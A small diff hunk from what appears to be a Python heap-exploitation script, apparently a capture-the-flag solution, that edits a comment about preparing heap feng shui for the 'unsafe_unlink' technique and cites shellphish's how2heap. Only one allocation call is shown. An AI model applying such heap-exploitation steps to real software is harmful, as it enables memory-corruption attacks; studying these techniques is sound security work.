@@ -146,7 +146,7 @@ if __name__ == "__main__":
     #
     # Step 1)
     #
-    # prepare heap feng shui suitable for "unsafe_unlink" technique
+    # prepare heap feng shui suitable for "unsafe_unlink" technique (refer shellphish's how2heap)
     #
 
     new_note('A'*0x100)
